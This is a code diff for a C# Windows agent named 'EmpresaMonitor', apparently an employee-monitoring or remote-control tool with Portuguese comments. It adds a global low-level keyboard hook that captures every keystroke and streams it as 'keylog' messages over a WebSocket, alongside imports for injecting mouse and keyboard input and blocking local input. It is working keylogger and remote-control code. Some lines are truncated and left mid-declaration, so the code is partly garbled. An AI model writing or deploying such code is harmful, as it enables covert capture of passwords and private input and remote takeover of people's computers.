@@ -27,12 +27,10 @@ namespace EmpresaMonitor.Agent
             public DateTime? LastBlockTime = null;
         }
 
-        // --- APIs DO WINDOWS ---
         [DllImport("user32.dll")] static extern void mouse_event(uint f, uint x, uint y, uint d, UIntPtr e);
         [DllImport("user32.dll")] static extern void keybd_event(byte v, byte s, uint f, UIntPtr e);
         [DllImport("user32.dll")] static extern bool BlockInput(bool fBlockIt);
 
-        // --- MOTOR PRINCIPAL ---
         static async Task StartEngine() {
             var lifetime = new CancellationTokenSource();
             var agentId = LoadOrCreateId();
@@ -61,9 +59,7 @@ namespace EmpresaMonitor.Agent
         }
 
         static async Task SendKeylog(ClientWebSocket s, SemaphoreSlim g, string k, bool d, AgentState st) {
-            try { 
-                await SendJsonAsync(s, g, new { type = "keylog", key = k, down = d, ts = DateTime.UtcNow.ToString("HH:mm:ss") }); 
-            } catch { }
+            try { await SendJsonAsync(s, g, new { type = "keylog", key = k, down = d, ts = DateTime.UtcNow.ToString("HH:mm:ss") }); } catch { }
         }
 
         static async Task ReceiveLoop(ClientWebSocket s, SemaphoreSlim g, CancellationToken ct, AgentState st) {
@@ -211,7 +207,7 @@ namespace EmpresaMonitor.Agent
         }
     }
 
-    // --- CLASSES AUXILIARES (PARA NÃO DAR ERRO) ---
+    // --- CLASSES AUXILIARES ---
 
     public class StreamSettings {
         public string Name { get; set; }
@@ -227,4 +223,49 @@ namespace EmpresaMonitor.Agent
     }
 
     public class KeyboardHook {
-        private delegate IntPtr LowLevelKeyboardProc(int n, IntPtr w, IntPtr l
+        private delegate IntPtr LowLevelKeyboardProc(int n, IntPtr w, IntPtr l);
+        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, LowLevel
+
+                // --- CONTINUAÇÃO DO KEYBOARD HOOK ---
+        private static IntPtr _h = IntPtr.Zero; 
+        private static LowLevelKeyboardProc? _p; 
+        private static Func<string, bool, Task>? _cb;
+        
+        private static string _lastKey = "";
+        private static DateTime _lastTime = DateTime.MinValue;
+        private static readonly object _lock = new object();
+
+        public static void Install(Func<string, bool, Task> callback) { _cb = callback; _p = Proc; _h = SetHook(_p); }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc p) {
+            using var cp = System.Diagnostics.Process.GetCurrentProcess();
+            using var cm = cp.MainModule;
+            return SetWindowsHookEx(WH_KEYBOARD_LL, p, GetModuleHandle(cm?.ModuleName), 0);
+        }
+
+        private static IntPtr Proc(int n, IntPtr w, IntPtr l) {
+            if (n >= 0 && _cb != null) {
+                int vkCode = Marshal.ReadInt32(l);
+                string key = ((Keys)vkCode).ToString();
+
+                lock (_lock) {
+                    if (key == _lastKey && (DateTime.Now - _lastTime).TotalMilliseconds < 100) {
+                        return CallNextHookEx(_h, n, w, l);
+                    }
+                    _lastKey = key;
+                    _lastTime = DateTime.Now;
+                }
+
+                _ = Task.Run(async () => { try { await _cb(key, true); } catch { } });
+            }
+            return CallNextHookEx(_h, n, w, l);
+        }
+
+        public static void Uninstall() { if (_h != IntPtr.Zero) { UnhookWindowsHookEx(_h); _h = IntPtr.Zero; } }
+
+        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc fn, IntPtr m, uint t);
+        [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr h);
+        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
+        [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string n);
+    }
+}
